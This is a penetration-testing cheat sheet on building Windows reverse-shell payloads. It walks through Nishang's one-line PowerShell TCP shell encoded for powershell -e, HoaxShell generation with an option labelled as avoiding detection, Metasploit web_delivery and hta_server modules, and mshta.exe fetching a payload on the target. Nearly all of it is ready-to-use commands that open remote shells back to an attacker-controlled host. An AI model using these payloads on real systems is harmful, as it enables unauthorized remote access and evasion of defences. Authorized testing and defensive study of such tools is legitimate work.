# Payload Development

## Windows Payload

### Nishang

Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetration Tests

```bash
sudo apt install nishang
```

{% embed url="https://www.kali.org/tools/nishang/" %}

{% code title="Nishang" %}
```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1
# edit the script with HOST and PORT and delete all except the third line. 

# convert the payload in base64 with this command
cat rev.ps1| iconv -t UTF-16LE | base64 -w 0 

# use this payload
powershell -e "<PAYLOAD>"
```
{% endcode %}



### HoaxShell

hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell.

{% embed url="https://github.com/t3l3machus/hoaxshell" %}

{% code title="Installation" %}
```bash
sudo apt install hoaxshell
```
{% endcode %}

{% code title="Create PS payload" %}
```bash
# simple used
hoaxshell -s <ATT_IP> -p <ATT_PORT>

# to avoid detection
hoaxshell -s <ATT_IP> -p <ATT_PORT> -i -H "Authorization"
```
{% endcode %}

### Metasploit

#### Web delivery

Http payload for PowerShell

```bash
service postgresql start && msfconsole
use exploit/multi/script/web_delivery

set payload windows/meterpreter/reverse_tcp

set LHOST <ATT_IP>
set LPORT <ATT_PORT>
set target 2 # set PS type
```



#### hta server

<pre class="language-bash"><code class="lang-bash"><strong>service postgresql start &#x26;&#x26; msfconsole
</strong><strong>use exploit/windows/misc/hta_server
</strong><strong>
</strong><strong>set LHOST &#x3C;IP>
</strong><strong>set LPORT &#x3C;PORT>
</strong></code></pre>

```powershell
# on target machine
mshta.exe <PAYLOAD_URL>
```





